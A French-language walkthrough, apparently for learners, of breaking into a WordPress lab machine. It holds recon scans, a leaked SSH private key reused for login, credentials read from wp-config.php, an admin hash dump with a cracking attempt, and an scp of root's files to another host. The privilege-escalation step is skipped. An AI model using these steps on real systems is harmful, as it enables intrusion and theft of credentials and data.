Walktrought OCSP.md

Executive Summary 

Please check my website 

http://172.16.21.106/


# Recon 

nmap -p- -sC -sV 172.16.21.106 --vv

Scanning 172.16.21.106 [65535 ports]
Discovered open port 22/tcp on 172.16.21.106
Discovered open port 80/tcp on 172.16.21.106
Discovered open port 33060/tcp on 172.16.21.106

<code>
 PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/secret.txt 
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: OSCP Voucher &#8211; Just another WordPress site
33060/tcp open  mysqlx? syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
</code>

3 ports semble ouverts ... C'est un site web "WORDPRESS". On regarde sur robot.txt avant d'aller plus loin , tiens donc  ! un fichier secret.txt à été laissé ;-)

un fichier en base64 à été posé est reste accessible depuis le net ... Bon pour bien faire les choses on vas se créer un dossier pour notre pentest /home/$user/pentest/nomdupentest/

on regarde le contenu du secret.txt 

envoi par mail poubelle 

wokel56738@stevefotos.com

touch secretfile.txt 

vi on copie/colle le contenu 

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
d0VBQVFBQUFZRUF0SENzU3pIdFVGOEs4dGlPcUVDUVlMcktLckNSc2J2cTZpSUc3UjlnMFdQdjl3
K2drVVdlCkl6QlNjdmdsTEU5ZmxvbHNLZHhmTVFRYk1WR3FTQURuWUJUYXZhaWdRZWt1ZTBiTHNZ
ay9yWjVGaE9VUlpMVHZkbEpXeHoKYklleUM1YTVGMERsOVVZbXpDaGU0M3owRG8waVF3MTc4R0pV
UWFxc2NMbUVhdHFJaVQvMkZrRitBdmVXM2hxUGZicnc5dgpBOVFBSVVBM2xlZHFyOFhFelkvL0xx
MCtzUWcvcFV1MEtQa1kxOGk2dm5maVlIR2t5VzFTZ3J5UGg1eDlCR1RrM2VSWWNOCnc2bURiQWpY
S0tDSEdNK2RubkdOZ3ZBa3FUK2daV3ovTXB5MGVrYXVrNk5QN05Dek9STnJJWEFZRmExcld6YUV0
eXBId1kKa0NFY2ZXSkpsWjcrZmNFRmE1QjdnRXd0L2FLZEZSWFBRd2luRmxpUU1ZTW1hdThQWmJQ
aUJJcnh0SVlYeTNNSGNLQklzSgowSFNLditIYktXOWtwVEw1T29Ba0I4ZkhGMzB1alZPYjZZVHVj
MXNKS1dSSElaWTNxZTA4STJSWGVFeEZGWXU5b0x1ZzBkCnRIWWRKSEZMN2NXaU52NG1SeUo5UmNy
aFZMMVYzQ2F6TlpLS3dyYVJBQUFGZ0g5SlFMMS9TVUM5QUFBQUIzTnphQzF5YzIKRUFBQUdCQUxS
d3JFc3g3VkJmQ3ZMWWpxaEFrR0M2eWlxd2tiRzc2dW9pQnUwZllORmo3L2NQb0pGRm5pTXdVbkw0
SlN4UApYNWFKYkNuY1h6RUVHekZScWtnQTUyQVUycjJvb0VIcExudEd5N0dKUDYyZVJZVGxFV1Mw
NzNaU1ZzYzJ5SHNndVd1UmRBCjVmVkdKc3dvWHVOODlBNk5Ja01OZS9CaVZFR3FySEM1aEdyYWlJ
ay85aFpCZmdMM2x0NGFqMzI2OFBid1BVQUNGQU41WG4KYXEvRnhNMlAveTZ0UHJFSVA2Vkx0Q2o1
R05mSXVyNTM0bUJ4cE1sdFVvSzhqNGVjZlFSazVOM2tXSERjT3BnMndJMXlpZwpoeGpQblo1eGpZ
THdKS2svb0dWcy96S2N0SHBHcnBPalQrelFzemtUYXlGd0dCV3RhMXMyaExjcVI4R0pBaEhIMWlT
WldlCi9uM0JCV3VRZTRCTUxmMmluUlVWejBNSXB4WllrREdESm1ydkQyV3o0Z1NLOGJTR0Y4dHpC
M0NnU0xDZEIwaXIvaDJ5bHYKWktVeStUcUFKQWZIeHhkOUxvMVRtK21FN25OYkNTbGtSeUdXTjZu
dFBDTmtWM2hNUlJXTHZhQzdvTkhiUjJIU1J4UyszRgpvamIrSmtjaWZVWEs0VlM5VmR3bXN6V1Np
c0sya1FBQUFBTUJBQUVBQUFHQkFMQ3l6ZVp0SkFwYXFHd2I2Y2VXUWt5WFhyCmJqWmlsNDdwa05i
VjcwSldtbnhpeFkzMUtqckRLbGRYZ2t6TEpSb0RmWXAxVnUrc0VUVmxXN3RWY0JtNU1abVFPMWlB
cEQKZ1VNemx2RnFpRE5MRktVSmRUajdmcXlPQVhEZ2t2OFFrc05tRXhLb0JBakduTTl1OHJSQXlq
NVBObzF3QVdLcENMeElZMwpCaGRsbmVOYUFYRFYvY0tHRnZXMWFPTWxHQ2VhSjBEeFNBd0c1Snlz
NEtpNmtKNUVrZldvOGVsc1VXRjMwd1FrVzl5aklQClVGNUZxNnVkSlBubUVXQXB2THQ2MkllVHZG
cWcrdFB0R25WUGxlTzNsdm5DQkJJeGY4dkJrOFd0b0pWSmRKdDNoTzhjNGoKa010WHN2TGdSbHZl
MWJaVVpYNU15bUhhbE4vTEExSXNvQzRZa2cvcE1nM3M5Y1lSUmttK0d4aVVVNWJ2OWV6d000Qm1r
bwpRUHZ5VWN5ZTI4endrTzZ0Z1ZNWng0b3NySW9OOVd0RFVVZGJkbUQyVUJaMm4zQ1pNa09WOVhK
eGVqdTUxa0gxZnM4cTM5ClFYZnhkTmhCYjNZcjJSakNGVUxEeGh3RFNJSHpHN2dmSkVEYVdZY09r
TmtJYUhIZ2FWN2t4enlwWWNxTHJzMFM3QzRRQUEKQU1FQWhkbUQ3UXU1dHJ0QkYzbWdmY2RxcFpP
cTYrdFc2aGttUjBoWk5YNVo2Zm5lZFV4Ly9RWTVzd0tBRXZnTkNLSzhTbQppRlhsWWZnSDZLLzVV
blpuZ0Viak1RTVRkT09sa2JyZ3BNWWloK1pneXZLMUxvT1R5TXZWZ1Q1TE1nakpHc2FRNTM5M00y
CnlVRWlTWGVyN3E5ME42VkhZWERKaFVXWDJWM1FNY0NxcHRTQ1MxYlNxdmttTnZoUVhNQWFBUzhB
SncxOXFYV1hpbTE1U3AKV29xZGpvU1dFSnhLZUZUd1VXN1dPaVlDMkZ2NWRzM2NZT1I4Um9yYm1H
bnpkaVpneFpBQUFBd1FEaE5YS21TMG9WTWREeQozZktaZ1R1d3I4TXk1SHlsNWpyYTZvd2ovNXJK
TVVYNnNqWkVpZ1phOTZFamNldlpKeUdURjJ1Vjc3QVEyUnF3bmJiMkdsCmpkTGtjMFl0OXVicVNp
a2Q1ZjhBa1psWkJzQ0lydnVEUVpDb3haQkd1RDJEVVd6T2dLTWxmeHZGQk5RRitMV0ZndGJyU1AK
T2dCNGloZFBDMSs2RmRTalFKNzdmMWJOR0htbjBhbW9pdUpqbFVPT1BMMWNJUHp0MGh6RVJMajJx
djlEVWVsVE9VcmFuTwpjVVdyUGdyelZHVCtRdmtrakdKRlgrcjh0R1dDQU9RUlVBQUFEQkFNMGNS
aERvd09GeDUwSGtFK0hNSUoyalFJZWZ2d3BtCkJuMkZONmt3NEdMWmlWY3FVVDZhWTY4bmpMaWh0
RHBlZVN6b3BTanlLaDEwYk53UlMwREFJTHNjV2c2eGMvUjh5dWVBZUkKUmN3ODV1ZGtoTlZXcGVy
ZzRPc2lGWk1wd0txY01sdDhpNmxWbW9VQmpSdEJENGc1TVlXUkFOTzBOajlWV01UYlc5UkxpUgpr
dW9SaVNoaDZ1Q2pHQ0NIL1dmd0NvZjllbkNlajRIRWo1RVBqOG5aMGNNTnZvQVJxN1ZuQ05HVFBh
bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==


super un petit coup de base64 -d (decode). On obtient 

ceci : 


-----BEGIN OPENSSH PRIVATE KEY-----
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
8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
-----END OPENSSH PRIVATE KEY-----

Tiens une clé ssh privée ! çà c'est pas mal alors ;-) 

on donne des droits unique sur le fichier secret.key pour root 

chmod 700 secret.key 


Et donc on vas déjà pour se connceter en ssh 

ssh -i secret.key oscp@172.16.21.106
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 26 Aug 2020 01:45:18 PM UTC

  System load:  0.03               Processes:             133
  Usage of /:   29.1% of 19.56GB   Users logged in:       0
  Memory usage: 33%                IPv4 address for eth0: 172.16.21.106
  Swap usage:   0%

 * Are you ready for Kubernetes 1.19? It's nearly here! Try RC3 with
   sudo snap install microk8s --channel=1.19/candidate --classic

   https://microk8s.io/ has docs and details.

35 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Sat Jul 11 16:50:11 2020 from 192.168.128.1
-bash-5.0$ 

on vérifie nos droits 

 id
uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
-bash-5.0$ more /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
oscp:x:1000:1000:oscp:/home/oscp:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false



nous sommes sous le compte utilisateur oscp. 

Donc résumons la première compromission à été réalisé il nous reste à avancer côté Wordpress si on fait un rapide tour dans /var/www/html/ que trouvons nous ? 

-bash-5.0$ ls -lash /var/www/html/
total 228K
4.0K drwxr-xr-x  5 nobody nogroup 4.0K Jul 11 16:44 .
4.0K drwxr-xr-x  3 root   root    4.0K Jul  9 05:57 ..
   0 -rw-r--r--  1 root   root       0 Jul  9 06:09 .htaccess
4.0K -rw-r--r--  1 nobody nogroup  405 Feb  6  2020 index.php
 20K -rw-r--r--  1 nobody nogroup  20K Feb 12  2020 license.txt
8.0K -rw-r--r--  1 nobody nogroup 7.2K Jan 10  2020 readme.html
4.0K -rw-r--r--  1 root   root      36 Jul  9 06:49 robots.txt
4.0K -rw-rw-r--  1 oscp   oscp    3.5K Jul  9 06:48 secret.txt
8.0K -rw-r--r--  1 nobody nogroup 6.8K Feb  6  2020 wp-activate.php
4.0K drwxr-xr-x  9 nobody nogroup 4.0K Jun 10 21:48 wp-admin
4.0K -rw-r--r--  1 nobody nogroup  351 Feb  6  2020 wp-blog-header.php
4.0K -rw-r--r--  1 nobody nogroup 2.3K Jun  2 20:26 wp-comments-post.php
4.0K -rw-r--r--  1 root   root    2.9K Jul  9 06:12 wp-config.php
4.0K -rw-r--r--  1 nobody nogroup 2.9K Feb  6  2020 wp-config-sample.php
4.0K drwxr-xr-x  4 nobody nogroup 4.0K Jun 10 21:48 wp-content
4.0K -rw-r--r--  1 nobody nogroup 3.9K Feb  6  2020 wp-cron.php
 12K drwxr-xr-x 21 nobody nogroup  12K Jun 10 21:48 wp-includes
4.0K -rw-r--r--  1 nobody nogroup 2.5K Feb  6  2020 wp-links-opml.php
4.0K -rw-r--r--  1 nobody nogroup 3.3K Feb  6  2020 wp-load.php
 48K -rw-r--r--  1 nobody nogroup  47K Feb 10  2020 wp-login.php
 12K -rw-r--r--  1 nobody nogroup 8.4K Apr 14 11:34 wp-mail.php
 20K -rw-r--r--  1 nobody nogroup  19K Apr 10 03:59 wp-settings.php
 32K -rw-r--r--  1 nobody nogroup  31K Feb  6  2020 wp-signup.php
8.0K -rw-r--r--  1 nobody nogroup 4.7K Feb  6  2020 wp-trackback.php
4.0K -rw-r--r--  1 nobody nogroup 3.1K Feb  6  2020 xmlrpc.php


C'est noël sans neige ni boule 

wpscan se tente ! allez ! on c'est jamais ! 

rien de particulier pas de plugin et la version est à jour 
par contre dans le listing ci dessus on voit que beaucoup trop de fichier sont en lecture et par trop de monde...  je pense notament à wp-config.php qui permet d'établir la config de base de la base de donnée entre autre chose . 

wpscan --url http://172.16.21.106 -U wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.4
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.16.21.106/ [172.16.21.106]
[+] Started: Thu Aug 27 09:34:13 2020


Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://172.16.21.106/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.16.21.106/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://172.16.21.106/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.16.21.106/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299


[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.16.21.106/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://172.16.21.106/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://172.16.21.106/wp-content/themes/twentytwenty/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://172.16.21.106/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://172.16.21.106/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.16.21.106/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <========================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Aug 27 09:34:18 2020
[+] Requests Done: 51
[+] Cached Requests: 6
[+] Data Sent: 12.065 KB
[+] Data Received: 328.794 KB
[+] Memory used: 192.27 MB
[+] Elapsed time: 00:00:05

Ce qu'il faut bien saisir ici c'est que nous sommes sur la dernière verison de wordpress et sans plugin donc rien à dire c'est nickel. Par contre ce qui ne colle pas du tout ce sont les droits utilisateurs qui permettent de lire tout les fichiers de config avec l'utilisateur oscp. Le contenu de wp-config.php nous donne les credentials de la bdd ...

-bash-5.0$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Oscp12345!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );


on a plus qu'a se connecter à la base de donnée et récupérer l'accès admin 

-bash-5.0$ mysql -u wordpress -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 139
Server version: 8.0.21-0ubuntu0.20.04.4 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 

un petit tour du côté requête sql est demandé si vous ne connaissez pas 

[https://laurent-audibert.developpez.com/Cours-BD/?page=langage-sql](langage sql par laurent audibert)

toutes lignes se termine par un ; sinon votre requête ne passe pas 

la commande show permet de visualiser


mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.01 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select admin from wp_user;
ERROR 1146 (42S02): Table 'wordpress.wp_user' doesn't exist
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+------------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url               | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+------------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | admin      | $P$Bx9ohXoCVR5lkKtuQbuWuh2P36Pr1D0 | admin         | offsec@offsec.com | http://192.168.128.135 | 2020-07-09 06:12:49 | 1598518035:$P$B6J.yu/Uiiw6AeVqVOWdluawXNuW4V/ |           0 | admin        |
+----+------------+------------------------------------+---------------+-------------------+------------------------+---------------------+-----------------------------------------------+-------------+--------------+
1 row in set (0.00 sec)

on récupère le hash du mot de passe donc $P$Bx9ohXoCVR5lkKtuQbuWuh2P36Pr1D0


Je teste le même mot de passe que pour la base de donnée Oscp12345! rien 

On vas aller sur john 

john wp_users.hash -wordlist /usr/share/wordlists/rockyou.txt

Bon rien non plus je laisse tomber cette piste çà sert à rien ! 

Aller revenons un peu plus sur la base du systeme. Sur quoi repose t'il ? 

uname -a 

Linux oscp 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64

oki on a aujourd'hui des versions un peu plus récente 
J'ai d'abord vérifié quelle version du noyau le système fonctionne, peut-être que j'aurais de la chance et que je trouverais un exploit d'escalade de privilège local.


uname -a ; cat /etc/debian_version ; cat /etc/lsb-release
Il semble que la cible utilise un noyau de la version 5.4.0. Depuis de l'eau à coulé sous les pont.  le noyau le plus récent est la version 5.8.1, sortie le 11 août 2020. Juste pour être sûr, j'ai vérifié s'il y avait des exploits publics disponibles, sans succès. Ensuite, j'ai décidé de consulter le répertoire d'accueil de /home/oscp pour voir ce que je peux découvrir.


ls -la /home/oscp
Le seul fichier que je vois s'appeler ip semble être un mini script bash. Je n'ai pas les privilèges pour écrire dans le fichier puisque je ne peux pas utiliser sudo. J'ai décidé de voir quels fichiers ont le bit SUID/GUID activé. Voici la sortie.

D'autres fichiers seront à trouvés. 

comme stage_clear.txt, le dossier 1UP et récupérer son contenu


bash-5.0# scp -r /root/1UP/ nico@10.0.11.3:/home/nico/Bureau/
nico@10.0.11.3's password: 
mushroom                                                                 100%    0     0.0KB/s   00:00    
warrio                                                                   100%    0     0.0KB/s   00:00    
mario                                                                    100%    0     0.0KB/s   00:00    
daisy                                                                    100%    0     0.0KB/s   00:00    
yoshi                                                                    100%    0     0.0KB/s   00:00    
luigi                                                                    100%    0     0.0KB/s   00:00    
stage_clear.txt                                                          100%  154     1.1KB/s   00:00    
readme.txt                                                               100%  205     9.0KB/s   00:00    
browser                                                                  100%    0     0.0KB/s   00:00    
star                                                                     100%    0     0.0KB/s   00:00    
bash-5.0# 



Les attendus : 

Avoir un rapport qui ne soit le plus exhaustif possible et suivant l'aisance de chaque apprenant. L'idée ici est qu'il puisse rentrer le plus d'information et de préconisation dans le rapport. 


Dans les grandes lignes la gestion des droits est un aspect majeur des failles ici. 
La clé ssh ne doit jamais être laissé ici , c'est trivial mais l'impact est important. 


Cela demande un peu de documentation 



